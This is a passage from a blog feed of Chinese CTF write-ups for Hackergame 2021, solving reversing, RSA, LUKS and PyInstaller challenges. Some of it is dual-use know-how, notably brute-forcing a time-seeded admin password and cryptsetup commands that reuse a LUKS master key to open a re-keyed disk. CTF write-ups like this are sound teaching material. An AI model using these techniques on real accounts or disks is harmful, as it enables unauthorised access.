(LongToBase16(left[<span class="number">0</span>]) + LongToBase16(left[<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;  <span class="comment">// 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来看 <code>code</code> 函数，根据 &lt;&lt; 4、 ^、 &gt;&gt;&gt; 5 可以大胆推测类似 TEA，然后解码就直接翻过来就好了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">2654435769</span> * <span class="number">32</span>; i != <span class="number">0</span>;) &#123;</span><br><span class="line">        left[<span class="number">1</span>] -= ((left[<span class="number">0</span>] &lt;&lt; <span class="number">4</span> ^ left[<span class="number">0</span>] &gt;&gt;&gt; <span class="number">5</span>) + left[<span class="number">0</span>] ^ i + right[i &gt;&gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>]);</span><br><span class="line">        i -= <span class="number">2654435769</span>;</span><br><span class="line">        left[<span class="number">0</span>] -= ((left[<span class="number">1</span>] &lt;&lt; <span class="number">4</span> ^ left[<span class="number">1</span>] &gt;&gt;&gt; <span class="number">5</span>) + left[<span class="number">1</span>] ^ i + right[i &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(left);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后把要得到的 res 分块，每 8 个一组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c</span><br></pre></td></tr></table></figure><p>然后从后往前，每两个执行 Base16ToLong，然后作为 left 传给 dec 函数解码，然后再 LongToStr4 得到四个字符:<br><img src="/p/d11ec8ed/minecRaft.jpg"><br>拼起来就是 flag 了：<code>flag&#123;McWebRE_inMlnCrA1t_3a5y_1cIuop9i&#125;</code></p><hr><h2 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h2><blockquote><p>小 T 最近又写了一个 web 应用。</p><p>他发现很多用户都喜欢设置弱密码，于是决定让所有用户的密码都必须是 16 位长，并且各种符号都要有。为了让大家可以方便生成这样的密码，他还写了一个密码生成器，让用户可以生成符合规则的密码。</p><p>但这样果真安全吗？</p></blockquote><p>（感觉这次 Hackergame 题的 tag 都很诡异。这题明明是 misc(general) 为什么打了 binary 的 tag）</p><p>看到 binary tag 直接先往 IDA 里面丢，然后报错了，大概是因为部分 winapi 导入不进去的问题（？）<br>然后就不会了…… 对着 IDA 干瞪眼</p><p>看题，题目给了一个网站，用来发布展板，看起来只有 admin 用户，而且没有注册系统，所以应该就是要搞到 admin 的密码了<br>再细看网站，特意提到 “网页显示<strong>时间</strong>”，而且展板后面都有发布时间，点进 admin 的用户页面发现也有注册时间，着实有些许诡异（<br>所以时间应该是一个提示</p><p>而写代码的时候设置随机数种子又常以当前时间作为种子，所以生成的密码可能是和时间有关系的<br>通过调系统时间，可以发现在同一秒点下生成，产生的密码是一样的<br>所以只需要把系统时间调到 admin 的注册时间左右，然后每秒生成密码，再挨个输进去爆破即可</p><p>最后得到 2021-09-22 23:10:53 时生成的密码 <code>$Z=CBDL7TjHu~mEX</code> 就是 admin 的密码<br>然后登录即可在“我的”里看到一条私密展板，内容是 flag</p><p>（其实这题搞得闹心的是每秒生成密码，像我这样的原始人只会反复调时间然后手动生成、复制粘贴，然后再复制粘贴检验密码）<br>（而且其实这个时间也试了很长时间，试了 23:11 的所有秒，15:11 的所有秒（考虑到了提到的时区问题））<br>（然后一共 120s 里也没有正确密码，就很闹心，最后的时间是 23:11 的前一分钟里的……我当时甚至想了，这些操作在一分钟之内都能完成，然后就没考虑前一分钟生成密码、后一分钟注册的问题……）<br>（于是就有了：</p><div style="text-align: center;"><img src="/p/d11ec8ed/generator.png" width="15%" height="15%"></div><hr><p>好了，我做上的题也就这些了，勉勉强强混了 4k2pt<br>没做上的题也好多：Amnesia2、赛博厨房23、灯、只读、一石二鸟、GPA、链上预言家、助记词2、Co-Program、外星人、befun、fzuu、wish、OI逆向<br>（草，好多qwq）<br>剩下的就看官方 Writeup 了（</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>RAID 相关的好多文章，没留作记录</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;/p/f152ab1f.html&quot;&gt;&amp;lt; #3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里接&lt;a href=&quot;/p/fd872e78.html&quot;&gt;上一篇&lt;/a&gt;，Writeup 的有：阵列恢复、马赛克、minecRaft、密码生成器&lt;br&gt;（其实 minecRaft 应该算“开局上分”篇，但是不好塞了，就放这里了）&lt;br&gt;剩下的就是做不上的了，看官方 Writeup 了（&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="Writeup" scheme="https://blog.tonycrane.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>「Hackergame 2021」#3 Writup 持续破防篇 0</title>
    <link href="https://blog.tonycrane.cc/p/f152ab1f.html"/>
    <id>https://blog.tonycrane.cc/p/f152ab1f.html</id>
    <published>2021-10-29T06:41:49.000Z</published>
    <updated>2021-10-29T13:51:02.097Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/f54b44c.html">&lt; #2</a></p><p><a href="/p/d11ec8ed.html">#4 &gt;</a></p></div><p>完成了前面两篇说到的那些题后，剩下的就开始反复折磨我了qwq<br>每天基本都肝到一点左右，甚至四五个小时毫无成果_(´ཀ`」 ∠)__<br>其中有些题回过头来看其实很简单，但是做的时候就是死活想不出来（</p><p>这篇 Writeup 里面有：Amnesia1、RSA、LUKS、MicroWorld</p><span id="more"></span><hr><h2 id="Amnesia"><a href="#Amnesia" class="headerlink" title="Amnesia"></a>Amnesia</h2><h3 id="轻度失忆"><a href="#轻度失忆" class="headerlink" title="轻度失忆"></a>轻度失忆</h3><blockquote><p>你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。</p><p>编译指令：<code>gcc -O file.c -m32</code></p><p>运行指令：<code>./a.out</code></p><p>编译后 ELF 文件的 .data 和 .rodata 段会被清零。</p></blockquote><p>ELF（Executable and Linkable Format）是 Linux 下常用的可执行文件格式，其中有很多不同的节：</p><ul><li><code>.text</code> 节：程序运行需要的代码</li><li><code>.data</code> 节：存放可修改的数据，一般是非 const 全局变量和静态变量</li><li><code>.rodata</code> 节：即 read only data，一般是常量或者字符串</li><li><code>.bss</code> 节：没有被初始化的变量</li><li>……</li></ul><p>而这道题目则是在编译生成可执行文件 a.out 后，清空 .data 和 .rodata<br>首先不妨正常编写一个输出 “Hello, world!” 的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello, world!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后编译，再拖到 IDA 里<br><img src="/p/f152ab1f/amn1.png"><br>可以发现，此时的 “Hello, world!” 被放到了 .rodata 节中，会被清除掉，所以这样写不行</p><p>直接使用字符串会被放到 .rodata 中清除，写成全局变量又会放到 .data 中<br>但是，如果写成局部变量呢：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> str[] = <span class="string">&quot;Hello, world!\n&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(str);</span><br></pre></td></tr></table></figure><p>编译，拖到 IDA 里<br><img src="/p/f152ab1f/amn2.png"><br>可以看出，这次的字符串直接写到了 .text 节中，删掉了 .data .rodata 也没有影响<br>所以把这个代码交上去就可以输出 “Hello, world!“ 拿到 flag 了 </p><p>清除记忆直接把 .text 节全删掉了，想了很久也不知道咋搞，虽然可以 __attribute__ ((section (“…”))) 来把函数或变量塞到指定的节中。但还是不清楚要怎么解决段错误的问题qwq </p><hr><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h2><blockquote><p>自从 Hackergame 2018 公然揭露了大整数可以被神童口算分解的事实，RSA 在 hackergame 中已经只能处于低分值的地位了。如果不在其名称前面加上 Easy 这个单词，似乎就会显得完全对不起其他题目。</p><p>更何况，在本题的附件中，你还获得了构造 p 和 q 的方式。数理基础扎实的你应该可以轻松解决这些问题吧。</p></blockquote><p><del>谢邀，没有数理基础</del></p><p>看代码！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_q</span>():</span></span><br><span class="line">    value = [getPrime(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        value.append(sympy.nextprime(value[i - <span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value[-1] = &quot;</span>, value[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        n = n * value[i]</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    value_q = <span class="built_in">pow</span>(q, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value_q = &quot;</span>, value_q)</span><br><span class="line">    <span class="comment"># value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this destroyes the rsa cryptosystem</span></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>, c)</span><br><span class="line"><span class="comment"># c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br></pre></td></tr></table></figure><p>可以看到，其中要解决的就是 <code>get_p()</code> 中 y! % x 溢出的问题，以及 <code>get_q()</code> 中 q 是哪个随机的512位质数的问题</p><h3 id="get-p"><a href="#get-p" class="headerlink" title="get_p"></a>get_p</h3><p>代码里也给了 Hint，观察 x 和 y 的特征。x 和 y 都很大，但是两个的差并不大；而且可以丢到 python 里验证出 x 是一个质数<br>所以可以使用<a href="https://en.wikipedia.org/wiki/Wilson's_theorem"><strong>威尔逊定理</strong></a><br>也查到了威尔逊定理在 RSA 题目中的应用：<a href="https://blog.csdn.net/xiao_han_a/article/details/118974504">BUU-RSA [RoarCTF2019]babyRSA</a></p><p>要求 y! % x（x是质数）<br>根据威尔逊定理，有</p><p>$$<br>(x - 1)! \equiv -1\pmod{x}<br>$$</p><p>所以：</p><p>$$<br>y!\times \frac{(x - 1)!}{y!}\equiv -1\pmod{x}<br>$$</p><p>令 $k = \dfrac{(x - 1)!}{y!} = (y+1)(y+2)…(x-1)x$ ，所以有：</p><p>$$<br>y!\equiv -\mathrm{inv}(k, x)\pmod{x}<br>$$</p><p>（其中 $\mathrm{inv}(k, x)$ 表示模 x 下 k 的逆元）<br>所以重写 get_p() 即可正确的得到 p：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = ...</span><br><span class="line">    y = ...</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(y + <span class="number">1</span>, x):</span><br><span class="line">        k = (k * i) % x </span><br><span class="line">    res = (-gmpy2.invert(k, x)) % x </span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(res)</span><br></pre></td></tr></table></figure><h3 id="get-q"><a href="#get-q" class="headerlink" title="get_q"></a>get_q</h3><p>相比来说，get_q 就没那么需要技巧了<br>给出了 value[-1] 的值，所以可以直接用 <code>sympy.prevprime</code> 逆推出整个 value 数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">value = [<span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    value.append(sympy.prevprime(value[i - <span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;value[-1] = &quot;</span>, value[-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>后面计算 value_q 细看其实也是一个 RSA 算法：</p><ul><li>q：密文</li><li>e：私钥</li><li>value_q：明文</li><li>n：就是 n，只不过不是两个质数相乘，是十个质数相乘 </li></ul><p>十个质数相乘得到 n 的 RSA 算法也一样，因为 RSA 的正确性并没有要求 n 一定是两个大质数相乘，这样只是难以破解保证安全性<br>解决这个同样也是需要公钥 d，所以需要 phi(n)<br>根据<a href="https://en.wikipedia.org/wiki/Euler%27s_totient_function">欧拉函数</a>的性质，phi(n) 等于 n 的所有质因数减一的积<br>即 phi(n) = (value[0] - 1) * (value[1] - 1) * … * (value[9] - 1)</p><p>再解密即可得到密文 q，然后也就得到了 get_q 的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    n = n * value[i]</span><br><span class="line">    phi *= (value[i] - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">value_q = ...</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi) </span><br><span class="line">q = <span class="built_in">pow</span>(value_q, d, n)</span><br><span class="line"><span class="keyword">return</span> sympy.nextprime(q)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>搞定了 get_p 和 get_q 之后就可以直接解出 flag 了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line"></span><br><span class="line">c = ...</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>.to_bytes(m, <span class="number">30</span>, byteorder=<span class="string">&quot;big&quot;</span>))</span><br></pre></td></tr></table></figure><hr><h2 id="加密的-U-盘"><a href="#加密的-U-盘" class="headerlink" title="加密的 U 盘"></a>加密的 U 盘</h2><p>（本来挺好做的一道题，怎么题给的提示我就硬是没领会到）</p><blockquote><p>这是一个关于 LUKS (Linux Unified Key Setup) 的故事。</p><p>第一天<br>小 T：「你要的随机过程的课件我帮你拷好了，在这个 U 盘里，LUKS 加密的密码是 suijiguocheng123123。」<br>小 Z：「啊，你又搞了 Linux 文件系统加密，真拿你没办法。我现在不方便用 Linux，我直接把这块盘做成磁盘镜像文件再回去处理吧。」</p><p>第二天<br>小 Z：「谢谢你昨天帮我拷的课件。你每次都搞这个加密，它真的安全吗？」<br>小 T：「当然了！你看，你还给我之后，我已经把这块盘的弱密码改掉了，现在是随机生成的强密码，这样除了我自己，世界上任何人都无法解密它了。」<br>小 Z：「我可不信。」<br>小 T：「你不信？你看，我现在往 U 盘里放一个 flag 文件，然后这个 U 盘就给你了，你绝对解密不出来这个文件的内容。当初搞 LUKS 的时候我可研究了好几天，班上可没人比我更懂加密！」</p></blockquote><p>一共给了两个 img 文件，通过 file 可以看出都是 DOS/MBR boot sector</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ file *.img </span><br><span class="line">day1.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)</span><br><span class="line">day2.img:      DOS/MBR boot sector; partition 1 : ID=0xee, start-CHS (0x0,0,2), end-CHS (0x3ff,255,63), startsector 1, 40959 sectors, extended partition table (last)</span><br></pre></td></tr></table></figure><p>所以先直接 7z 提取，得到两个新的 img，再 file：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ file *.img </span><br><span class="line">My Disk.img:   LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998</span><br><span class="line">My Disk 2.img: LUKS encrypted file, ver 2 [, , sha256] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998</span><br></pre></td></tr></table></figure><p>发现都是 LUKS encrypted file</p><p>在 Kali Linux 里尝试直接挂载第一个 img，要求输入密码，把题给的密码输入就可以看到 “课件”</p><p>以上都是已知的试验部分，真正要做的是解开第二个未知密码的 LUKS img<br>已知磁盘的加密使用的是 luks2，在网上查了破解 luks2 之类的都说 luks2 <strong>不可破解</strong>，或者是使用已知的密码字典来爆破<br>但是题里说了 “<strong>随机生成</strong>的强密码”，所以也是没有密码字典的</p><p>其实这道题的最大提示就在于它给了两个 img，既然第一个 img 打开后仅仅是一个课件，如果它的用处仅仅是用来试验 luks 怎么打开的话，根本它没必要给出<br>所以第一个 img 肯定还是有用的。</p><p>再看题目，反复说了 U 盘，所以这两个 img 应该是同一个 U 盘的镜像文件，只是更改了密码而已（file 看到的 uuid 也是一致的）<br>于是继续必应，发现同一个磁盘的 <code>master-key</code> 是一样的，而且可以用 master-key 来添加密码恢复磁盘（见：<a href="https://www.thegeekstuff.com/2016/03/cryptsetup-lukskey/">10 Linux cryptsetup Examples for LUKS Key Management</a>）</p><p>所以就跟着文章里的做法，从第一个 img 中提取出 master-key，然后用它来提供 AddKey 的权限。添加了新 passphrase 后就可以用新密码打开磁盘了：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ cryptsetup luksDump --dump-master-key MyDisk.img  <span class="comment"># 输出 master-key</span></span><br><span class="line">...</span><br><span class="line">MK dump:    be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 </span><br><span class="line">            72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c </span><br><span class="line">            ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 </span><br><span class="line">            60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a</span><br><span class="line">$ cat <span class="string">&quot;be...9a&quot;</span> &gt; master_key.txt <span class="comment"># 存入文件</span></span><br><span class="line">$ xxd -r -p master_key.txt master_key.bin <span class="comment"># 转为二进制</span></span><br><span class="line">$ cryptsetup luksAddKey MyDisk2.img --master-key-file &lt;(cat master_key.bin) <span class="comment"># 添加密码</span></span><br><span class="line">Enter new passphrase <span class="keyword">for</span> key slot:    <span class="comment"># 输入新密码即可，因为master-key-file相当于提供了原始密码</span></span><br><span class="line">Verify passphrase: </span><br></pre></td></tr></table></figure><p>（一定要用 root 权限才可以加密码）<br>然后挂载、输入密码，就可以看到 flag.txt 了</p><hr><h2 id="Micro-World"><a href="#Micro-World" class="headerlink" title="Micro World"></a>Micro World</h2><blockquote><p>宇宙中某一片极其微小的区域里的粒子被一股神秘力量初始化设置成了 flag 的形状，程序忠实地记录了一段时间之后这片区域的粒子运动情况。</p></blockquote><p>拿到了 exe 文件，看起来挺精致，运行起来是一些点运动碰撞的场景<br>拖到 IDA 里看看，发现了 __main__ 以及 .rdata 里一些 py 有关的字符串：<br><img src="/p/f152ab1f/microworld.png"><br>所以推测是使用 python 编写的，然后用 pyinstaller 打包</p><p>这样的话试着用 <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> 解包 .exe，成功得到一个文件夹<br>里面是一堆 .pyc .pyd .dll 文件，从名字就可以看出大部分是 import 的包，只有一个特别的 2.pyc<br>所以这个应该就是编译后的源码了</p><p>接下来用 <a href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a> 来反编译 pyc 文件，输出得到了源码 2.py<br>尝试运行，发现跑起来之后只有一个点在运动，应该是反编译时出了些问题<br>于是开始看源码 </p><p>基本上简单说就是，初始有一些数据，表示每个点的位置和速度，然后运行，每次运行都检测碰撞，然后获得新的点位置，再绘制出来<br>调试一下，输出每次的 pointlist，发现第一次是所有点，第二次变成2个，第三次往后就只有一个了<br>所以问题大概就出在了 next_pos_list 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_pos_list</span>(<span class="params">Pointlist</span>):</span></span><br><span class="line">    pointlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Pointlist)):</span><br><span class="line">        <span class="keyword">for</span> point <span class="keyword">in</span> Pointlist[i + <span class="number">1</span>:]:</span><br><span class="line">            times = checkcrush(Pointlist[i], point)</span><br><span class="line">            <span class="keyword">if</span> times != <span class="literal">None</span>:</span><br><span class="line">                a, b = get_new_point(times, Pointlist[i], point)</span><br><span class="line">                pointlist.extend([a, b])</span><br><span class="line">                Pointlist[i].flag = <span class="number">0</span></span><br><span class="line">                point.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> Pointlist:</span><br><span class="line">                <span class="keyword">if</span> item.flag != <span class="number">0</span>:</span><br><span class="line">                    pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy))</span><br><span class="line">                <span class="keyword">for</span> poi <span class="keyword">in</span> pointlist:</span><br><span class="line">                    poi.x = poi.x % WIDTH</span><br><span class="line">                    poi.y = poi.y % HEIGHT</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> pointlist</span><br></pre></td></tr></table></figure><p>仔细读一读，可以发现这里面的 for-else 块很奇怪，导致循环结束和 return 都早了，所以根据函数的意思改一改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_pos_list</span>(<span class="params">Pointlist</span>):</span></span><br><span class="line">    pointlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Pointlist)):</span><br><span class="line">        <span class="keyword">for</span> point <span class="keyword">in</span> Pointlist[i + <span class="number">1</span>:]:</span><br><span class="line">            ...</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> Pointlist:</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> pointlist</span><br></pre></td></tr></table></figure><p>这样就可以成功运行了</p><p>但是画面仍然是杂乱的。因为题里说了 “记录了<strong>一段时间之后</strong>这片区域的粒子运动情况”<br>所以需要将轨迹往前推，最方便的方法就是更改每个点的速度方向：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pointlist = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list_:</span><br><span class="line">    Pointlist.append(Point((item[<span class="number">0</span>], item[<span class="number">1</span>]), -item[<span class="number">2</span>], -item[<span class="number">3</span>]))</span><br></pre></td></tr></table></figure><p>运行后等待一小会儿就可以看到点逐渐有序，在某一刻汇成了 flag：<br><img src="/p/f152ab1f/mwans.jpg"><br>虽然不太清晰，但是也可以猜个大概</p><hr><p>又写了蛮长的，剩下的放在<a href="/p/d11ec8ed.html">下一篇</a><em>(:з」∠)</em></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://en.wikipedia.org/wiki/Wilson's_theorem">Wilson’s theorem - wikipedia</a></li><li><a href="https://blog.csdn.net/xiao_han_a/article/details/118974504">BUU-RSA [RoarCTF2019]babyRSA - CSDN</a></li><li><a href="https://en.wikipedia.org/wiki/Euler%27s_totient_function">Euler’s totient function - wikipedia</a></li><li><a href="https://gitlab.com/cryptsetup/LUKS2-docs/blob/master/luks2_doc_wip.pdf">LUKS2 doc pdf</a></li><li><a href="https://www.thegeekstuff.com/2016/03/cryptsetup-lukskey/">10 Linux cryptsetup Examples for LUKS Key Management</a></li><li><a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a></li><li><a href="https://github.com/rocky/python-uncompyle6/">uncompyle6</a></li></ul><div style="display: flex; justify-content: space-between;"><p><a href="/p/f54b44c.html">&lt; #2</a></p><p><a href="/p/d11ec8ed.html">#4 &gt;</a></p></div>]]></content>
    
    
    <summary type="html">&lt;div style=&quot;display: flex; justify-content: space-between;&quot;&gt;

&lt;p&gt;&lt;a href=&quot;/p/f54b44c.html&quot;&gt;&amp;lt; #2&lt;/a&gt;&lt;/p&gt;
